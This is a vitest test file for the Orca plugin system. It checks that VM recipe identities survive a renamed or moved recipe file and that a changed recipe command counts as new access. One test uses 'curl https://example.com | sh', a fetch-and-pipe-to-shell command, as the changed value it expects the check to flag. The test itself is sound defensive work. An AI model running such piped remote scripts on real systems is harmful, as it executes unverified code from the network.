import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import {
  pluginManifestSchema,
  type PluginManifest
} from '../../shared/plugins/manifest/plugin-manifest'
import { pluginUpdateAccessGrowth } from '../../shared/plugins/approval/plugin-update-access-growth'
import { readPluginVmRecipeIdentities } from './plugin-vm-recipe-identities'

const roots: string[] = []
afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
})

const recipe = {
  schemaVersion: 1,
  id: 'multipass-ubuntu-lts',
  name: 'Multipass Ubuntu LTS',
  create: 'multipass launch 24.04 --name "$ORCA_VM_NAME"',
  destroy: 'multipass delete "$ORCA_VM_NAME" --purge'
}

function manifest(version: string, path: string): PluginManifest {
  return pluginManifestSchema.parse({
    manifestVersion: 1,
    id: 'orca-multipass-recipes',
    publisher: 'stablyai',
    name: 'Multipass VM Recipes',
    version,
    engines: { orca: '>=1.0.0' },
    pluginApi: 1,
    capabilities: [],
    contributes: { vmRecipes: [{ path }] }
  })
}

async function pluginTree(path: string, contents: string): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'orca-vm-recipe-identities-'))
  roots.push(root)
  await mkdir(join(root, 'recipes'), { recursive: true })
  await writeFile(join(root, path), contents)
  return root
}

describe('readPluginVmRecipeIdentities', () => {
  it('treats a moved, reworded recipe with the same commands as nothing new', async () => {
    const v1 = manifest('1.0.0', 'recipes/ubuntu-lts.json')
    const v2 = manifest('2.0.0', 'recipes/ubuntu.json')
    const installed = await readPluginVmRecipeIdentities(
      await pluginTree('recipes/ubuntu-lts.json', JSON.stringify(recipe)),
      v1
    )
    const next = await readPluginVmRecipeIdentities(
      await pluginTree(
        'recipes/ubuntu.json',
        JSON.stringify({ ...recipe, name: 'Ubuntu' }, null, 2)
      ),
      v2
    )
    expect(next).toEqual(installed)
    expect(pluginUpdateAccessGrowth(v1, v2, { installed, next }).contributions).toEqual([])
  })

  it('reports a changed command as new', async () => {
    const v1 = manifest('1.0.0', 'recipes/ubuntu-lts.json')
    const installed = await readPluginVmRecipeIdentities(
      await pluginTree('recipes/ubuntu-lts.json', JSON.stringify(recipe)),
      v1
    )
    const next = await readPluginVmRecipeIdentities(
      await pluginTree(
        'recipes/ubuntu-lts.json',
        JSON.stringify({ ...recipe, create: 'curl https://example.com | sh' })
      ),
      v1
    )
    expect(pluginUpdateAccessGrowth(v1, v1, { installed, next }).contributions).toEqual([
      'vmRecipes'
    ])
  })

  it('returns null when a recipe file is missing', async () => {
    const root = await mkdtemp(join(tmpdir(), 'orca-vm-recipe-identities-'))
    roots.push(root)
    await expect(
      readPluginVmRecipeIdentities(root, manifest('1.0.0', 'recipes/ubuntu-lts.json'))
    ).resolves.toBeNull()
  })
})
